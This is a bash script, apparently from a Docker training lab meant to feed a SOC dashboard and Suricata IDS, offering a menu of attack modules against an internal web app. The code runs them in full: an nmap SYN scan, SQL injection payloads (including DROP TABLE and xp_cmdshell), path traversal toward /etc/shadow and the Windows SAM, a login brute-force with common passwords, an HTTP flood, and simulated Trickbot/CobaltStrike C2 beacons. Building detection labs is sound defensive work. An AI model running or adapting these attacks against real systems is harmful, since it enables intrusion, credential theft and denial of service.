#!/bin/bash
# ═══════════════════════════════════════════════════════════════════
#  KALI ATTACK BOX — Enterprise Network Penetration Testing CLI
# ═══════════════════════════════════════════════════════════════════
#
#  Usage:  ./attack.sh <command>
#
#  Commands:
#    scan     — SYN port scan against the DMZ web server
#    sqli     — SQL injection payloads against /api/search
#    exploit  — Path traversal and directory probing
#    brute    — Credential brute-force against /api/login
#    ddos     — HTTP request flood (volumetric)
#    malware  — Simulated C2 beaconing / Trickbot patterns
#    recon    — Full reconnaissance (robots.txt, headers, etc.)
#    full     — Run ALL attack phases sequentially
#    help     — Show this help message
#
# ═══════════════════════════════════════════════════════════════════

set -e

TARGET="${TARGET_HOST:-enterprise-web-app}"
TARGET_IP="${TARGET_IP:-10.0.2.80}"
ATTACKER_IP="198.51.100.42"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color
BOLD='\033[1m'

banner() {
    echo -e "${RED}"
    echo "  ╔══════════════════════════════════════════════════════╗"
    echo "  ║     🔓 KALI ATTACK BOX — Penetration Testing CLI   ║"
    echo "  ║     Target: ${TARGET} (${TARGET_IP})              ║"
    echo "  ║     Attacker: ${ATTACKER_IP}                        ║"
    echo "  ╚══════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

separator() {
    echo -e "${CYAN}──────────────────────────────────────────────────────${NC}"
}

# ── ATTACK MODULES ────────────────────────────────────────────────

attack_scan() {
    banner
    echo -e "${YELLOW}[PHASE 1] 🔍 Network Reconnaissance — SYN Port Scan${NC}"
    separator
    echo -e "${PURPLE}Launching Nmap SYN scan against ${TARGET_IP}...${NC}"
    echo ""

    # TCP SYN scan of common ports
    nmap -sS -T4 -p 21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,8080,8443 \
         ${TARGET} 2>/dev/null || {
        # Fallback: TCP connect scan if SYN scan not available
        echo -e "${YELLOW}SYN scan requires raw sockets, falling back to TCP connect scan...${NC}"
        nmap -sT -T4 -p 21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,8080,8443 \
             ${TARGET} 2>/dev/null || echo "Nmap scan completed"
    }

    echo ""
    echo -e "${GREEN}[✓] Port scan complete — results logged by Suricata IDS${NC}"
    separator
}

attack_sqli() {
    banner
    echo -e "${YELLOW}[PHASE 2] 💉 SQL Injection Attack${NC}"
    separator
    echo -e "${PURPLE}Injecting SQL payloads against ${TARGET}/api/search...${NC}"
    echo ""

    # Array of realistic SQL injection payloads
    PAYLOADS=(
        "' OR '1'='1"
        "' OR '1'='1' --"
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
        "' UNION SELECT id,name,email,department,role FROM employees--"
        "'; DROP TABLE employees;--"
        "admin'--"
        "' OR 1=1 UNION SELECT username,password,NULL,NULL,NULL FROM users--"
        "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
        "' OR ''='"
        "1; EXEC xp_cmdshell('whoami')--"
        "' UNION SELECT @@version,NULL,NULL,NULL,NULL--"
        "admin' AND SUBSTRING(password,1,1)='a'--"
    )

    for i in "${!PAYLOADS[@]}"; do
        PAYLOAD="${PAYLOADS[$i]}"
        echo -e "${RED}  [$(($i+1))/${#PAYLOADS[@]}] Payload: ${PAYLOAD}${NC}"

        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
            --max-time 5 \
            --get \
            --data-urlencode "q=${PAYLOAD}" \
            "http://${TARGET}/api/search" \
            2>/dev/null || echo "000")

        if [ "$RESPONSE" = "200" ]; then
            echo -e "${GREEN}    → HTTP ${RESPONSE} — Potential SQLi vulnerability!${NC}"
        elif [ "$RESPONSE" = "500" ]; then
            echo -e "${YELLOW}    → HTTP ${RESPONSE} — Server error (SQL syntax error triggered)${NC}"
        else
            echo -e "${CYAN}    → HTTP ${RESPONSE}${NC}"
        fi
        sleep 0.3
    done

    echo ""
    echo -e "${GREEN}[✓] SQL injection attack complete — ${#PAYLOADS[@]} payloads sent${NC}"
    separator
}

attack_exploit() {
    banner
    echo -e "${YELLOW}[PHASE 3] 🗂️  Path Traversal & Exploit Probing${NC}"
    separator
    echo -e "${PURPLE}Probing ${TARGET} for file inclusion and directory traversal...${NC}"
    echo ""

    # Path traversal payloads
    TRAVERSAL_PATHS=(
        "../../../../etc/passwd"
        "../../../../etc/shadow"
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd"
        "/etc/passwd"
        "....//....//....//etc/passwd"
        "../../../../windows/system32/config/sam"
        "..\\..\\..\\..\\windows\\system32\\config\\sam"
    )

    echo -e "${RED}  [A] Path Traversal Attacks:${NC}"
    for path in "${TRAVERSAL_PATHS[@]}"; do
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
            --max-time 5 \
            "http://${TARGET}/docs/download?file=${path}" 2>/dev/null || echo "000")
        echo -e "    ${CYAN}GET /docs/download?file=${path}${NC} → HTTP ${RESPONSE}"
        sleep 0.2
    done

    echo ""
    echo -e "${RED}  [B] Admin Panel Probing:${NC}"
    ADMIN_PATHS=("/admin/" "/admin/config" "/admin/users" "/admin/dashboard" "/backup/" "/config/")
    for apath in "${ADMIN_PATHS[@]}"; do
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
            --max-time 5 \
            "http://${TARGET}${apath}" 2>/dev/null || echo "000")
        echo -e "    ${CYAN}GET ${apath}${NC} → HTTP ${RESPONSE}"
        sleep 0.2
    done

    echo ""
    echo -e "${GREEN}[✓] Exploit probing complete${NC}"
    separator
}

attack_brute() {
    banner
    echo -e "${YELLOW}[PHASE 4] 🔐 Credential Brute-Force Attack${NC}"
    separator
    echo -e "${PURPLE}Brute-forcing ${TARGET}/api/login...${NC}"
    echo ""

    # Common username/password combinations
    USERS=("admin" "root" "administrator" "user" "test" "guest" "operator" "sysadmin" "webadmin" "support")
    PASSWORDS=("password" "123456" "admin" "root" "toor" "letmein" "qwerty" "abc123" "Enterprise@2024" "welcome1" "changeme" "p@ssw0rd")

    ATTEMPTS=0
    FOUND=0

    for user in "${USERS[@]}"; do
        for pass in "${PASSWORDS[@]}"; do
            ATTEMPTS=$((ATTEMPTS + 1))
            RESPONSE=$(curl -s -w "\n%{http_code}" \
                --max-time 5 \
                -X POST \
                -H "Content-Type: application/json" \
                -d "{\"username\":\"${user}\",\"password\":\"${pass}\"}" \
                "http://${TARGET}/api/login" 2>/dev/null)

            HTTP_CODE=$(echo "$RESPONSE" | tail -1)
            BODY=$(echo "$RESPONSE" | head -1)

            if [ "$HTTP_CODE" = "200" ]; then
                echo -e "${GREEN}  [${ATTEMPTS}] ✅ CREDENTIALS FOUND: ${user}:${pass} → HTTP ${HTTP_CODE}${NC}"
                FOUND=$((FOUND + 1))
            else
                echo -e "${RED}  [${ATTEMPTS}] ✗ ${user}:${pass} → HTTP ${HTTP_CODE}${NC}"
            fi
            sleep 0.1
        done
    done

    echo ""
    echo -e "${GREEN}[✓] Brute-force complete — ${ATTEMPTS} attempts, ${FOUND} credential(s) found${NC}"
    separator
}

attack_ddos() {
    banner
    echo -e "${YELLOW}[PHASE 5] 🌊 HTTP Flood (Volumetric DDoS Simulation)${NC}"
    separator
    echo -e "${PURPLE}Flooding ${TARGET} with rapid HTTP requests...${NC}"
    echo ""

    TOTAL=200
    CONCURRENT=10
    COMPLETED=0

    echo -e "${RED}  Sending ${TOTAL} requests (${CONCURRENT} concurrent)...${NC}"
    echo ""

    for i in $(seq 1 $TOTAL); do
        curl -s -o /dev/null --max-time 2 "http://${TARGET}/" &

        # Rate-limit concurrent connections
        if (( i % CONCURRENT == 0 )); then
            wait
            COMPLETED=$((COMPLETED + CONCURRENT))
            echo -e "  ${CYAN}Progress: ${COMPLETED}/${TOTAL} requests sent${NC}"
        fi
    done
    wait

    echo ""
    echo -e "${GREEN}[✓] DDoS flood complete — ${TOTAL} requests sent to target${NC}"
    separator
}

attack_malware() {
    banner
    echo -e "${YELLOW}[PHASE 6] 🦠 Malware C2 Beaconing Simulation${NC}"
    separator
    echo -e "${PURPLE}Simulating Trickbot/C2 outbound beaconing patterns...${NC}"
    echo ""

    # Simulate C2 beacon check-ins with suspicious User-Agent strings
    C2_AGENTS=(
        "Mozilla/4.0 (compatible; MSIE 8.0; Trickbot/2.0)"
        "TrickLoader/1.0"
        "Emotet-Downloader/3.1"
        "CobaltStrike/4.7 (BEACON)"
        "Meterpreter/x64/reverse_tcp"
    )

    C2_PATHS=(
        "/gate.php"
        "/c2/checkin"
        "/update/config.bin"
        "/panel/tasks"
        "/bot/register"
        "/api/beacon"
    )

    BEACONS=20
    echo -e "${RED}  Sending ${BEACONS} C2 beacon check-ins...${NC}"
    echo ""

    for i in $(seq 1 $BEACONS); do
        AGENT=${C2_AGENTS[$((RANDOM % ${#C2_AGENTS[@]}))]}
        C2PATH=${C2_PATHS[$((RANDOM % ${#C2_PATHS[@]}))]}

        curl -s -o /dev/null --max-time 3 \
            -H "User-Agent: ${AGENT}" \
            -H "X-Bot-ID: BOT-$(cat /proc/sys/kernel/random/uuid 2>/dev/null | cut -c1-8 || echo $RANDOM)" \
            "http://${TARGET}${C2PATH}" 2>/dev/null || true

        echo -e "  ${RED}[${i}/${BEACONS}] Beacon → ${C2PATH} (UA: ${AGENT})${NC}"
        sleep 0.5
    done

    echo ""
    echo -e "${GREEN}[✓] C2 beaconing simulation complete${NC}"
    separator
}

attack_recon() {
    banner
    echo -e "${YELLOW}[PHASE 0] 🕵️  Full Reconnaissance${NC}"
    separator
    echo -e "${PURPLE}Gathering intelligence on ${TARGET}...${NC}"
    echo ""

    echo -e "${CYAN}  [1] HTTP Headers:${NC}"
    curl -sI "http://${TARGET}/" 2>/dev/null | head -20
    echo ""

    echo -e "${CYAN}  [2] Robots.txt:${NC}"
    curl -s "http://${TARGET}/robots.txt" 2>/dev/null
    echo ""

    echo -e "${CYAN}  [3] Server Status:${NC}"
    curl -s "http://${TARGET}/api/status" 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "(raw response)"
    echo ""

    echo -e "${GREEN}[✓] Reconnaissance complete${NC}"
    separator
}

attack_full() {
    echo -e "${BOLD}${RED}Running FULL attack chain...${NC}"
    echo ""
    attack_recon
    sleep 1
    attack_scan
    sleep 1
    attack_sqli
    sleep 1
    attack_exploit
    sleep 1
    attack_brute
    sleep 1
    attack_ddos
    sleep 1
    attack_malware
    echo ""
    echo -e "${BOLD}${GREEN}════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}${GREEN}  FULL ATTACK CHAIN COMPLETE                       ${NC}"
    echo -e "${BOLD}${GREEN}  Check SOC Dashboard for detected threats!         ${NC}"
    echo -e "${BOLD}${GREEN}════════════════════════════════════════════════════${NC}"
}

show_help() {
    banner
    echo -e "${BOLD}Available Commands:${NC}"
    echo ""
    echo -e "  ${CYAN}scan${NC}     — SYN port scan (Nmap) against DMZ web server"
    echo -e "  ${CYAN}sqli${NC}     — SQL injection payloads against /api/search"
    echo -e "  ${CYAN}exploit${NC}  — Path traversal and admin panel probing"
    echo -e "  ${CYAN}brute${NC}    — Credential brute-force against /api/login"
    echo -e "  ${CYAN}ddos${NC}     — HTTP request flood (200 rapid requests)"
    echo -e "  ${CYAN}malware${NC}  — Simulated C2/Trickbot beaconing"
    echo -e "  ${CYAN}recon${NC}    — Full reconnaissance (headers, robots, status)"
    echo -e "  ${CYAN}full${NC}     — Run ALL attack phases sequentially"
    echo -e "  ${CYAN}help${NC}     — Show this help message"
    echo ""
    echo -e "${BOLD}Examples:${NC}"
    echo -e "  ${GREEN}docker compose exec kali-attacker ./attack.sh scan${NC}"
    echo -e "  ${GREEN}docker compose exec kali-attacker ./attack.sh sqli${NC}"
    echo -e "  ${GREEN}docker compose exec kali-attacker ./attack.sh full${NC}"
    echo ""
}

# ── Main Dispatcher ───────────────────────────────────────────────

case "${1:-help}" in
    scan)    attack_scan    ;;
    sqli)    attack_sqli    ;;
    exploit) attack_exploit ;;
    brute)   attack_brute   ;;
    ddos)    attack_ddos    ;;
    malware) attack_malware ;;
    recon)   attack_recon   ;;
    full)    attack_full    ;;
    help)    show_help      ;;
    *)
        echo -e "${RED}Unknown command: $1${NC}"
        show_help
        exit 1
        ;;
esac
